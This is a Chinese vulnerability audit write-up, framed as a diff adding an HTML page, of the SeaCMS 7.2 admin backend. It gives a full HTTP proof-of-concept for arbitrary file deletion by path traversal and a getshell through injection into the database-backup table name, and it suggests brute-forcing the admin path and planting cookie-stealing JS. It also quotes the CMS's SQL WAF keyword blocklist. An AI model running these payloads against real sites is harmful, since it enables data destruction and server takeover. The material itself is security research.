@@ -1,0 +1,305 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="b0c9c2b1f95b8e57502ebcbbf247c4b4">Seacms7.2-任意文件删除&amp;Getshell（后台篇）</h2>
+<blockquote>
+<p>code:<code>https://www.seacms.net</code><br/>
+Version:<code>7.2</code></p>
+</blockquote>
+<h3 data-content="1" id="1ee13c8754f9ba1045c343493392a5f9">0x01 前言</h3>
+<p>小伙伴在群里丢了个站说指纹识别出来是seacms 百度找到的已知漏洞均无效 于是就审计一下咯。</p>
+<p>本来想照样黑盒测试 发现前台在测<a href="https://xz.aliyun.com/t/3788" target="_blank">74cms任意文件夹删除</a>时payload的目录没注意多写了两层 平常积累的各种工具 写的代码全被格了 没有备份...</p>
+<p>![B7C804FC7B1293C44690B9E4EA2636A0]</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190107190845-99bfc022-126c-1.jpeg"/></p>
+<h3 data-content="1" id="8c1965f17b5f0c94526ea64f3f104172">0x02 过程</h3>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190107190905-a5d057aa-126c-1.png"/></p>
+<p>打开代码目录注意到版本号和dedecms一样 写到了<code>ver.txt</code>里 实战中可先看一下版本 再使用对应exp。</p>
+<p>版本查看：</p>
+<pre><code>http://host.com/data/admin/ver.txt</code></pre>
+<p>安装完发现后台目录并不是有规律的单词一类的 看了下<code>/install/index.php</code>文件的代码第279-299中有个randomkeys函数</p>
+<pre><code>function randomkeys($length)   
+    {   
+    $pattern = 'abcdefgh1234567890jklmnopqrstuvwxyz';  
+    for($i=0;$i&lt;$length;$i++)   
+    {   
+        $key .= $pattern{mt_rand(0,35)}; 
+    }   
+    return $key;   
+    }
+
+    $newadminname=randomkeys(6);
+    $jpath='../admin';
+    $xpath='../'.$newadminname;
+    $cadmin=rename($jpath,$xpath);
+    if($cadmin==true){$cadmininfo='【重要】：后台管理地址：'.$baseurl.'/'.$newadminname;}
+    else{$cadmininfo='【重要】：后台管理地址：'.$baseurl.'/admin';}
+
+    include('./templates/step-5.html');
+    exit();
+
+}</code></pre>
+<p>randomkeys函数是生成随机字符串的 <code>$newadminname</code>调用并取了一个六位的字符串 随后将默认的admin目录重命名为这个随机的字符串。bp爆破payload设置方式如下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190107190925-b1308b88-126c-1.png"/></p>
+<h4 data-content="1" id="9942433bfddc82965e4eed182c1c2d40">0x02_1 任意文件删除</h4>
+<p>看到后台目录下的admin_template.php时发现法：<br/>
+前30行代码为</p>
+<pre><code>&lt;?php
+require_once(dirname(__FILE__)."/config.php");
+if(empty($action))
+{
+    $action = '';
+}
+
+$dirTemplate="../templets";
+
+if($action=='edit')
+{
+    if(substr(strtolower($filedir),0,11)!=$dirTemplate){
+        ShowMsg("只允许编辑templets目录！","admin_template.php");
+        exit;
+    }
+    $filetype=getfileextend($filedir);
+    if ($filetype!="html" &amp;&amp; $filetype!="htm" &amp;&amp; $filetype!="js" &amp;&amp; $filetype!="css" &amp;&amp; $filetype!="txt")
+    {
+        ShowMsg("操作被禁止！","admin_template.php");
+        exit;
+    }
+    $filename=substr($filedir,strrpos($filedir,'/')+1,strlen($filedir)-1);
+    $content=loadFile($filedir);
+    $content = m_eregi_replace("&lt;textarea","##textarea",$content);
+    $content = m_eregi_replace("&lt;/textarea","##/textarea",$content);
+    $content = m_eregi_replace("&lt;form","##form",$content);
+    $content = m_eregi_replace("&lt;/form","##/form",$content);
+    include(sea_ADMIN.'/templets/admin_template.htm');
+    exit();
+}</code></pre>
+<p><code>$dirTemplate</code>固定了仅为<code>../templets</code>目录 并在编辑前取了路径的前11位字符串来和<code>../templets</code>对比 如果不等就提示只允许编辑templets目录！那么你不允许我编辑<code>../templets</code>前的路径来遍历文件目录 我编辑后面的来遍历呢？</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190107191008-cae9bda6-126c-1.png"/></p>
+<p>的确可行 但是没法编辑或者读文件 因为</p>
+<pre><code>if ($filetype!="html" &amp;&amp; $filetype!="htm" &amp;&amp; $filetype!="js" &amp;&amp; $filetype!="css" &amp;&amp; $filetype!="txt")
+    {
+        ShowMsg("操作被禁止！","admin_template.php");
+        exit;
+    }</code></pre>
+<p>在编辑或读取文件后程序会先验证一遍文件后缀 限制了紧紧允许编辑html htm js css txt这四种文件 实战中此处可利用来插入js代码 获取cookie 维权使用。</p>
+<p>跟随看到下面的第114-132行</p>
+<pre><code>elseif($action=='del')
+{
+    if($filedir == '')
+    {
+        ShowMsg('未指定要删除的文件或文件名不合法', '-1');
+        exit();
+    }
+    if(substr(strtolower($filedir),0,11)!=$dirTemplate){
+        ShowMsg("只允许删除templets目录内的文件！","admin_template.php");
+        exit;
+    }
+    $folder=substr($filedir,0,strrpos($filedir,'/'));
+    if(!is_dir($folder)){
+        ShowMsg("目录不存在！","admin_template.php");
+        exit;
+    }
+    unlink($filedir);
+    ShowMsg("操作成功！","admin_template.php?path=".$folder);
+    exit;
+}</code></pre>
+<p>可以注意到此处并未像上面一样限制后缀 即可即可遍历到上级目录取删除指定任意文件。</p>
+<p>POC（删除install_lock.txt文件）：</p>
+<pre><code>GET /qdybap/admin_template.php?action=del&amp;filedir=../templets/default/images/../../../install/install_lock.txt HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/qdybap/admin_template.php?path=../templets/default/images
+Connection: close
+Cookie: think_template=default; __tins__19820877=%7B%22sid%22%3A%201546784203337%2C%20%22vd%22%3A%204%2C%20%22expires%22%3A%201546786104291%7D; __51cke__=; __51laig__=6; PHPSESSID=5322944de96922c98817ca8b2463c379; __tins__19820873=%7B%22sid%22%3A%201546784394633%2C%20%22vd%22%3A%202%2C%20%22expires%22%3A%201546786703612%7D
+Upgrade-Insecure-Requests: 1</code></pre>
+<p>效果：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190107191029-d77cc180-126c-1.png"/></p>
+<p>跟随看到下面的代码 看到第164行代码为：</p>
+<pre><code>createTextFile($content,$filedir."/self_".$name.".html");</code></pre>
+<p>创建的文件的后缀直接写死了的 这意味着无法通过此处写入shell。<br/>
+那么就没办法了么？</p>
+<h4 data-content="1" id="b012a62ce8c3cd2b213c14b09bf028c2">0x02_2 Getshell</h4>
+<p>关于Getshell 笔者从中午一点 一直研究到下午五点 终于终于绕过重重限制了！！！</p>
+<h5 data-content="1" id="d247504e3ba0e7d7fbcefa5a1742e208">0x02_2_1 第一次绝望</h5>
+<p>先看上传的限制：</p>
+<pre><code>/include/uploadsafe.inc.php: 
+   12  //为了防止用户通过注入的可能性改动了数据库 
+   13: //这里强制限定的某些文件类型禁止上传
+   14  $cfg_not_allowall = "php|pl|cgi|asp|asa|cer|aspx|jsp|php3|shtm|shtml";
+   15  $keyarr = array('name','type','tmp_name','size');</code></pre>
+<p>直接写死 不允许上传php文件</p>
+<p>后台目录下的/uploads.php:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190107191055-e7672e46-126c-1.png"/></p>
+<p>第48行：</p>
+<pre><code>var $allowExts = array('jpg', 'gif',  'png', 'rar', 'zip', 'bmp');</code></pre>
+<p>白名单写死</p>
+<h5 data-content="1" id="eecb51e71666d9fe5abdf2f6de674e4c">0x02_2_2 第二次绝望</h5>
+<p>最让人绝望的是另一处</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190107191119-f59e8022-126c-1.png"/></p>
+<p>看起来是可以改配置的</p>
+<p>实际上</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190107191138-00c20dc0-126d-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190107191156-0b79c8ac-126d-1.png"/></p>
+<p><code>/Users/CoolCat/php/qdybap/admin_config_mark.php</code>第25-52行</p>
+<pre><code>if(is_uploaded_file($newimg))
+    {
+        $allowimgtype= explode('|',$cfg_imgtype);
+        $finfo=pathinfo($newimg_name);
+        $imgfile_type = $finfo['extension'];
+        if(!in_array($imgfile_type,$allowimgtype))
+        {
+            ShowMsg("上传的图片格式错误，请使用 {$cfg_photo_support}格式的其中一种！","-1");
+            exit();
+        }
+        if($imgfile_type=='image/xpng')
+        {
+            $shortname = ".png";
+        }
+        else if($imgfile_type=='image/gif')
+        {
+            $shortname = ".gif";
+        }
+        else if($imgfile_type=='image/jpeg')
+        {
+            $shortname = ".jpg";
+        }
+        else 
+        {
+            $shortname = ".gif";
+        }
+        $photo_markimg = 'mark'.$shortname;
+        @move_uploaded_file($newimg,sea_DATA."/mark/".$photo_markimg);</code></pre>
+<p>严格限制死的 配置的确写出来了 但是仅仅作了一个提示而已 实际上传过程中固定只能上传<code>jpg|gif|png</code> 而且过了了单引号 无法通过此处写出shell</p>
+<p>给你希望又让你绝望</p>
+<h5 data-content="1" id="c710c2f406f994f61bcaf74c944bd957">0x02_2_3 第三次绝望</h5>
+<p>于是笔者又寄希望于另一处</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190107191223-1b6704c8-126d-1.png"/></p>
+<p>通过sql的outfile写出shell文件。但是</p>
+<p>看到/include/sql.class.php的545-638行</p>
+<pre><code>//如果是普通查询语句，直接过滤一些特殊语法
+    if($querytype=='select')
+    {
+        $notallow1 = "[^0-9a-z@\._-]{1,}(union|sleep|benchmark|load_file|outfile)[^0-9a-z@\.-]{1,}";
+
+        //$notallow2 = "--|/\*";
+        if(m_eregi($notallow1,$db_string))
+        {
+            fputs(fopen($log_file,'a+'),"$userIP||$getUrl||$db_string||SelectBreak\r\n");
+            exit("&lt;font size='5' color='red'&gt;Safe Alert: Request Error step 1 !&lt;/font&gt;");
+        }
+    }
+
+    //完整的SQL检查
+    while (true)
+    {
+        $pos = strpos($db_string, '\'', $pos + 1);
+        if ($pos === false)
+        {
+            break;
+        }
+        $clean .= substr($db_string, $old_pos, $pos - $old_pos);
+        while (true)
+        {
+            $pos1 = strpos($db_string, '\'', $pos + 1);
+            $pos2 = strpos($db_string, '\\', $pos + 1);
+            if ($pos1 === false)
+            {
+                break;
+            }
+            elseif ($pos2 == false || $pos2 &gt; $pos1)
+            {
+                $pos = $pos1;
+                break;
+            }
+            $pos = $pos2 + 1;
+        }
+        $clean .= '$s$';
+        $old_pos = $pos + 1;
+    }
+    $clean .= substr($db_string, $old_pos);
+    $clean = trim(strtolower(preg_replace(array('~\s+~s' ), array(' '), $clean)));
+
+    //老版本的Mysql并不支持union，常用的程序里也不使用union，但是一些黑客使用它，所以检查它
+    if (strpos($clean, 'union') !== false &amp;&amp; preg_match('~(^|[^a-z])union($|[^[a-z])~s', $clean) != 0)
+    {
+        $fail = true;
+        $error="union detect";
+    }
+
+    //发布版本的程序可能比较少包括--,#这样的注释，但是黑客经常使用它们
+    elseif (strpos($clean, '/*') &gt; 2 || strpos($clean, '--') !== false || strpos($clean, '#') !== false)
+    {
+        $fail = true;
+        $error="comment detect";
+    }
+
+    //这些函数不会被使用，但是黑客会用它来操作文件，down掉数据库
+    elseif (strpos($clean, 'sleep') !== false &amp;&amp; preg_match('~(^|[^a-z])sleep($|[^[a-z])~s', $clean) != 0)
+    {
+        $fail = true;
+        $error="slown down detect";
+    }
+    elseif (strpos($clean, 'benchmark') !== false &amp;&amp; preg_match('~(^|[^a-z])benchmark($|[^[a-z])~s', $clean) != 0)
+    {
+        $fail = true;
+        $error="slown down detect";
+    }
+    elseif (strpos($clean, 'load_file') !== false &amp;&amp; preg_match('~(^|[^a-z])load_file($|[^[a-z])~s', $clean) != 0)
+    {
+        $fail = true;
+        $error="file fun detect";
+    }
+    elseif (strpos($clean, 'into outfile') !== false &amp;&amp; preg_match('~(^|[^a-z])into\s+outfile($|[^[a-z])~s', $clean) != 0)
+    {
+        $fail = true;
+        $error="file fun detect";
+    }
+
+    //老版本的MYSQL不支持子查询，我们的程序里可能也用得少，但是黑客可以使用它来查询数据库敏感信息
+    elseif (preg_match('~\([^)]*?select~s', $clean) != 0)
+    {
+        $fail = true;
+        $error="sub select detect";
+    }
+    if (!empty($fail))
+    {
+        fputs(fopen($log_file,'a+'),"$userIP||$getUrl||$db_string||$error\r\n");
+        exit("&lt;font size='5' color='red'&gt;Safe Alert: Request Error step 2!&lt;/font&gt;");
+    }
+    else
+    {
+        return $db_string;
+    }</code></pre>
+<p>限制得死死的</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190107191243-27614b26-126d-1.png"/></p>
+<p>而且是两层waf</p>
+<p>那么真的没办法了么？</p>
+<h5 data-content="1" id="a11d6a7480b69428d6a6959396a00d8d">0x02_2_4 拨云见雾</h5>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190107191306-35129784-126d-1.png"/></p>
+<p>笔者在测试数据库备份时注意到备份文件是以php为后缀的 这样的好处是可以防止数据库备份被扫描下载</p>
+<p>既然是php文件 那么能不能通过修改数据库再备份到getshell呢？</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190107191349-4f102fb6-126d-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190107191415-5e7727ac-126d-1.png"/></p>
+<p>Poc：</p>
+<pre><code>POST /qdybap/ebak/phomebak.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/qdybap/ebak/ChangeTable.php?mydbname=seacms&amp;keyboard=sea
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1157
+Connection: close
+Cookie: think_template=default; __tins__19820877=%7B%22sid%22%3A%201546784203337%2C%20%22vd%22%3A%204%2C%20%22expires%22%3A%201546786104291%7D; __51cke__=; __51laig__=7; PHPSESSID=5322944de96922c98817ca8b2463c379; __tins__19820873=%7B%22sid%22%3A%201546849264391%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201546851064391%7D
+Upgrade-Insecure-Requests: 1
+
+phome=DoEbak&amp;mydbname=seacms&amp;baktype=0&amp;filesize=1024&amp;bakline=1000&amp;autoauf=1&amp;bakstru=1&amp;dbchar=utf8&amp;bakdatatype=1&amp;mypath=seacms_20190107_uLDbip&amp;insertf=replace&amp;waitbaktime=0&amp;readme=&amp;tablename%5B%5D=sea_admin&amp;tablename%5B%5D=sea_arcrank&amp;tablename%5B%5D=sea_buy&amp;tablename%5B%5D=sea_cck&amp;tablename%5B%5D=sea_co_cls&amp;tablename%5B%5D=sea_co_config&amp;tablename%5B%5D=sea_co_data&amp;tablename%5B%5D=sea_co_filters&amp;tablename%5B%5D=sea_co_news&amp;tablename%5B%5D=sea_co_type&amp;tablename%5B%5D=sea_co_url&amp;tablename%5B%5D=sea_comment&amp;tablename%5B%5D=sea_content&amp;tablename%5B%5D=sea_count&amp;tablename%5B%5D=sea_crons&amp;tablename%5B%5D=sea_data&amp;tablename%5B%5D=sea_erradd&amp;tablename%5B%5D=sea_favorite&amp;tablename%5B%5D=sea_flink&amp;tablename%5B%5D=sea_guestbook&amp;tablename%5B%5D=sea_ie&amp;tablename%5B%5D=sea_jqtype&amp;tablename%5B%5D=sea_member&amp;tablename%5B%5D=sea_member_group&amp;tablename%5B%5D=sea_myad&amp;tablename%5B%5D=sea_mytag&amp;tablename%5B%5D=sea_news&amp;tablename%5B%5D=sea_playdata&amp;tablename%5B%5D=sea_search_keywords&amp;tablename%5B%5D=sea_tags&amp;tablename%5B%5D=sea_temp&amp;tablename%5B%5D=sea_topic&amp;tablename%5B%5D=sea_type&amp;tablename%5B%5D=phpinfo()&amp;chkall=on&amp;Submit=%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD</code></pre>
+<p>此处笔者也遇到个坑 构造payload时要兼顾截图中圈起来的右上和做下两处 否则会出错（错误代码500）结果发现<code>phpinfo()</code> 不用改 刚好就可以用了。</p>
+<p>至此 该CMS后台审计结束。</p>
+<h3 data-content="1" id="a6f92323c2d9306c699fb5669bbbb419">0x03 总结</h3>
+<p>笔者在fb上看到过该CMS的作者在公布其0day的文章下看到其心平气和的点评漏洞 估计其本身也接触安全这块 后台限制的确写得六 两层waf 小弟佩服！</p>
+</div>
+</div>
